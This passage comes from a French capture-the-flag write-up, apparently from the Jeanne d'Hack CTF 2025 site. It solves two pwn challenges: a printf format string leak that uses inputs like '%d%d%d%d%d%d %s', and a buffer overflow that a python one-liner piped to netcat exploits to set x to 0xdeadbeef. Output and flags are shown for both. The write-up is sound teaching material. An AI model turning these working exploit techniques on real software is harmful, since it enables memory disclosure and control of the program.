+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (len <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>) {
+</span></span><span style="display:flex;"><span>    len <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(user_input);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    len <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x20</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> equal <span style="color:#f92672">=</span> <span style="color:#a6e22e">strncmp</span>(thoughts,user_input,len);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (equal <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">show_flag</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,user_input,len);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(buffer <span style="color:#f92672">+</span> len,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> you say? I don</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">t think so</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">0x1c</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(buffer);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Cette fonction compare la chaîne aléatoire générée par la fonction <code>create_thoughts</code> avec l&rsquo;entrée de
+l&rsquo;utilisateur. En cas d&rsquo;égalité, le flag est affiché ; sinon, le programme concatène l&rsquo;entrée de
+l&rsquo;utilisateur à une autre chaîne avant de la passer en premier paramètre à <code>printf</code>. Nous avons donc
+deux tentatives pour essayer de trouver la chaîne aléatoire.</p>
+<p>La vulnérabilité du programme réside dans l&rsquo;utilisation de <code>printf</code>. En effet, l&rsquo;utilisateur peut
+contrôler le premier paramètre <code>format</code>. Le premier argument de la fonction <code>printf</code> en C est une
+chaîne de format qui spécifie comment les arguments suivants doivent être affichés. Cette chaîne
+peut contenir des spécificateurs de format, des textes littéraux et des caractères d&rsquo;échappement.</p>
+<p>Dans ce cas, <code>buffer</code> est utilisé directement comme format pour <code>printf</code>. Cela signifie que si un
+utilisateur malveillant fournit une entrée dans <code>buffer</code> contenant des spécificateurs de
+format (comme <code>%s</code>, <code>%x</code>, etc.), cela peut permettre de lire ou d&rsquo;écrire en mémoire.</p>
+<p>Pour comprendre comment cette vulnérabilité peut être exploitée, il est nécessaire de saisir
+comment des fonctions comme <code>printf</code> récupèrent et traitent leurs arguments. La fonction <code>printf</code>
+en C utilise un mécanisme appelé fonctions variadiques pour gérer un nombre variable d&rsquo;arguments.
+Cela signifie que <code>printf</code> peut accepter un nombre d&rsquo;arguments qui n&rsquo;est pas fixé à l&rsquo;avance,
+ce qui est essentiel pour son fonctionnement.</p>
+<p>La déclaration de <code>printf</code> dans <code>&lt;stdio.h&gt;</code> ressemble à ceci :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">printf</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>format, ...);
+</span></span></code></pre></div><p>Le premier argument est une chaîne de format, et le second argument (indiqué par <code>...</code>) signifie qu&rsquo;il
+peut y avoir un nombre variable d&rsquo;arguments supplémentaires. Pour accéder à ces arguments
+supplémentaires, <code>printf</code> utilise les macros <code>va_start</code>, <code>va_list</code>, <code>va_end</code> et <code>va_arg</code> définies
+dans le fichier d&rsquo;en-tête <code>&lt;stdarg.h&gt;</code>.</p>
+<p>L&rsquo;implémentation exacte de ces macros dépasse le cadre de cet article, mais en résumé, celle-ci passe
+par l&rsquo;utilisation de la pile. Au moment de l&rsquo;appel à la fonction, les arguments variadiques sont
+empilés et peuvent être récupérés grâce à <code>va_arg</code> en fonction de leur type.</p>
+<p>Par exemple, considérons le code suivant :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> foo <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Hello %s, you are %d years old.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;Alice&#34;</span>, <span style="color:#ae81ff">30</span>);
+</span></span></code></pre></div><p>Au moment de l&rsquo;appel de la fonction, la pile ressemblera à ceci :</p>
+<pre tabindex="0"><code>|------------------|
+|      &#34;Alice&#34;     | &lt;- Argument variadique 1
+|------------------|
+|        30        | &lt;- Argument variadique 2
+|------------------|
+|       ...        | 
+|------------------|
+|       foo        | &lt;- Adresse mémoire de foo 
+|------------------|
+</code></pre><p>Par conséquent, il est possible de lire les valeurs en pile (comme la variable <code>foo</code>) en détournant
+l&rsquo;utilisation légitime du paramètre <code>format</code>. En effet, si l&rsquo;on entre par exemple <code>%x</code> dans le programme,
+on obtiendra la sortie suivante :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>█████▒▓█████ ▄▄▄       ██▀███      ███▄ ▄███▓▓██   ██▓   ▄▄▄█████▓ ██░ ██  ▒█████   █    ██   ▄████  ██░ ██ ▄▄▄█████▓  ██████
+</span></span><span style="display:flex;"><span>▓██   ▒ ▓█   ▀▒████▄    ▓██ ▒ ██▒   ▓██▒▀█▀ ██▒ ▒██  ██▒   ▓  ██▒ ▓▒▓██░ ██▒▒██▒  ██▒ ██  ▓██▒ ██▒ ▀█▒▓██░ ██▒▓  ██▒ ▓▒▒██    ▒
+</span></span><span style="display:flex;"><span>▒████ ░ ▒███  ▒██  ▀█▄  ▓██ ░▄█ ▒   ▓██    ▓██░  ▒██ ██░   ▒ ▓██░ ▒░▒██▀▀██░▒██░  ██▒▓██  ▒██░▒██░▄▄▄░▒██▀▀██░▒ ▓██░ ▒░░ ▓██▄
+</span></span><span style="display:flex;"><span>░▓█▒  ░ ▒▓█  ▄░██▄▄▄▄██ ▒██▀▀█▄     ▒██    ▒██   ░ ▐██▓░   ░ ▓██▓ ░ ░▓█ ░██ ▒██   ██░▓▓█  ░██░░▓█  ██▓░▓█ ░██ ░ ▓██▓ ░   ▒   ██▒
+</span></span><span style="display:flex;"><span>░▒█░    ░▒████▒▓█   ▓██▒░██▓ ▒██▒   ▒██▒   ░██▒  ░ ██▒▓░     ▒██▒ ░ ░▓█▒░██▓░ ████▓▒░▒▒█████▓ ░▒▓███▀▒░▓█▒░██▓  ▒██▒ ░ ▒██████▒▒
+</span></span><span style="display:flex;"><span>▒ ░    ░░ ▒░ ░▒▒   ▓▒█░░ ▒▓ ░▒▓░   ░ ▒░   ░  ░   ██▒▒▒      ▒ ░░    ▒ ░░▒░▒░ ▒░▒░▒░ ░▒▓▒ ▒ ▒  ░▒   ▒  ▒ ░░▒░▒  ▒ ░░   ▒ ▒▓▒ ▒ ░
+</span></span><span style="display:flex;"><span>░       ░ ░  ░ ▒   ▒▒ ░  ░▒ ░ ▒░   ░  ░      ░ ▓██ ░▒░        ░     ▒ ░▒░ ░  ░ ▒ ▒░ ░░▒░ ░ ░   ░   ░  ▒ ░▒░ ░    ░    ░ ░▒  ░ ░
+</span></span><span style="display:flex;"><span>░ ░       ░    ░   ▒     ░░   ░    ░      ░    ▒ ▒ ░░       ░       ░  ░░ ░░ ░ ░ ▒   ░░░ ░ ░ ░ ░   ░  ░  ░░ ░  ░      ░  ░  ░
+</span></span><span style="display:flex;"><span>░  ░     ░  ░   ░               ░    ░ ░                  ░  ░  ░    ░ ░     ░           ░  ░  ░  ░               ░
+</span></span><span style="display:flex;"><span>░ ░
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>My thoughts are messy and strange, can you read them?
+</span></span><span style="display:flex;"><span>&gt; %x
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;99800f33&#34;</span> you say? I don<span style="color:#960050;background-color:#1e0010">&#39;</span>t think so
+</span></span><span style="display:flex;"><span>You make me pity. I give you one last chance
+</span></span></code></pre></div><p>La valeur <code>99800f33</code> correspond à une valeur présente sur la pile. Parmi les variables présentes dans
+la pile au moment de l&rsquo;exécution, il existe un pointeur vers la chaîne <code>thoughts</code>, puisque celui-ci
+a été utilisé précédemment dans le programme. On peut donc récupérer sa valeur via le premier appel
+à <code>read_thoughts</code> pour l&rsquo;utiliser lors du second appel. On obtient alors ceci :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>My thoughts are messy and strange, can you read them?
+</span></span><span style="display:flex;"><span>&gt; %d%d%d%d%d%d %s
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;-196803786328-196803786300-1164857392 b3iE7QGRTTi8ZU3CYGJF8GdYfaSr9dS&#34;</span> you say? I don<span style="color:#960050;background-color:#1e0010">&#39;</span>t think so
+</span></span><span style="display:flex;"><span>You make me pity. I give you one last chance
+</span></span><span style="display:flex;"><span>&gt; b3iE7QGRTTi8ZU3CYGJF8GdYfaSr9dS
+</span></span><span style="display:flex;"><span>JDHACK<span style="color:#f92672">{</span>my_tHoU6Ht5_ARE_Me5sy_AnD_d@RK<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>On récupère ainsi notre flag : <code>JDHACK{my_tHoU6Ht5_ARE_Me5sy_AnD_d@RK}</code> !</p>
+<h2 id="special-value">Special Value</h2>
+<p>Les sources du challenge sont disponibles <a href="https://github.com/JeanneD-Hack-CTF/JeanneD-Hack-CTF-2025/blob/main/pwn/Special_Value">ici</a>.</p>
+<blockquote>
+<p><strong>Énoncé</strong></p>
+<p>Vous avez découvert un programme qui semble contenir des failles qui peuvent être exploitées pour obtenir une
+avance significative dans la bataille contre l&rsquo;oppression. Vous devrez donc utiliser tous vos talents de hacker
+pour trouver une faille et en profiter pour obtenir la valeur ciblée.</p>
+<p>Cependant, vous devrez agir avec précision et rapidité car les forces de l&rsquo;ordre sont toujours en surveillance.
+Vous devrez donc trouver la faille, exploiter le programme et obtenir la valeur ciblée avant qu&rsquo;ils ne vous
+découvrent et ne prennent des mesures pour arrêter votre action.</p>
+<p>Vous avez réussi à récupèrer une copie du programme (special_value).</p>
+<p>Pour vous connecter au service distant:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>netcat 127.0.0.1 <span style="color:#ae81ff">9003</span>
+</span></span></code></pre></div><p>Le flag est contenu dans le fichier flag.txt.</p></blockquote>
+<p>Ce programme est relativement simple puisqu&rsquo;il est composé seulement de la fonction <code>main</code> suivante:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">void</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buffer [<span style="color:#ae81ff">128</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> x;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(banner);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Do you know how to find the special value?&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(buffer,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">132</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">fflush</span>(stdout);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>,buffer,<span style="color:#ae81ff">132</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;x = %lx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,x);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (x <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xdeadbeef</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">win</span>(); <span style="color:#75715e">// Print the flag
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>En examinant le programme de près, on constate qu&rsquo;il peut écrire jusqu&rsquo;à 132 caractères dans un tableau dont la taille est
+limitée à 128. Dépasser cette taille entraînera l&rsquo;écrasement de la mémoire adjacente, y compris la variable <code>x</code>. Cela
+offre à un attaquant la possibilité de modifier la valeur de <code>x</code> en écrivant des données au-delà de la fin de <code>buffer</code>,
+ce qui est précisément l&rsquo;objectif du challenge. Ce phénomène est connu sous le nom de &ldquo;dépassement de tampon&rdquo;
+(ou &ldquo;Buffer Overflow&rdquo; en anglais).</p>
+<p>Ainsi, en envoyant 128 caractères de remplissage (padding), suivis de la valeur attendue en format little endian, il devient
+possible de récupérer le flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#39;import sys; sys.stdout.buffer.write(b&#34;a&#34;*128+b&#34;\xef\xbe\xad\xde&#34;+b&#34;\n&#34;)&#39;</span> | netcat 127.0.0.1 <span style="color:#ae81ff">9003</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   _____                 _       ___      __   _
+</span></span><span style="display:flex;"><span>  / ____|               <span style="color:#f92672">(</span>_<span style="color:#f92672">)</span>     | <span style="color:#ae81ff">\ \ </span>   / /  | |
+</span></span><span style="display:flex;"><span> | <span style="color:#f92672">(</span>___  _ __   ___  ___ _  __ _| |<span style="color:#ae81ff">\ \ </span> / /_ _| |_   _  ___
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">\_</span>__ <span style="color:#ae81ff">\|</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>_ <span style="color:#ae81ff">\ </span>/ _ <span style="color:#ae81ff">\/</span> __| |/ _<span style="color:#e6db74">`</span> | | <span style="color:#ae81ff">\ \/</span> / _<span style="color:#e6db74">`</span> | | | | |/ _ <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  ____<span style="color:#f92672">)</span> | |_<span style="color:#f92672">)</span> |  __/ <span style="color:#f92672">(</span>__| | <span style="color:#f92672">(</span>_| | |  <span style="color:#ae81ff">\ </span> / <span style="color:#f92672">(</span>_| | | |_| |  __/
+</span></span><span style="display:flex;"><span> |_____/| .__/ <span style="color:#ae81ff">\_</span>__|<span style="color:#ae81ff">\_</span>__|_|<span style="color:#ae81ff">\_</span>_,_|_|   <span style="color:#ae81ff">\/</span> <span style="color:#ae81ff">\_</span>_,_|_|<span style="color:#ae81ff">\_</span>_,_|<span style="color:#ae81ff">\_</span>__|
+</span></span><span style="display:flex;"><span>        | |
+</span></span><span style="display:flex;"><span>        |_|
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Do you know how to find the special value?
+</span></span><span style="display:flex;"><span>&gt; x <span style="color:#f92672">=</span> deadbeef
+</span></span><span style="display:flex;"><span>Here is your flag:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>JDHACK<span style="color:#f92672">{</span>You_D1d_FOUND_my_SpecIaL_v4lu3<span style="color:#f92672">}</span>
+</span></span></code></pre></div><p>On obtient alors notre flag: <code>JDHACK{You_D1d_FOUND_my_SpecIaL_v4lu3}</code> !</p>
+<ul class="pa0">
+  
+</ul>
+<div class="mt6 instapaper_ignoref">
+      
+      
+      </div>
+    </div>
+
+    <aside class="w-30-l mt6-l">
+
+
+
+
+</aside>
+
+  </article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 no-underline white-70 dn dib-ns pv2 ph3" >
+    &copy;  2025  Jeanne d'Hack CTF. Tous droits réservés. 
+  </a>
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="/legal/" >
+      Mentions légales
+  </a>
+  </div>
+</footer>
+
+  </body>
+</html>
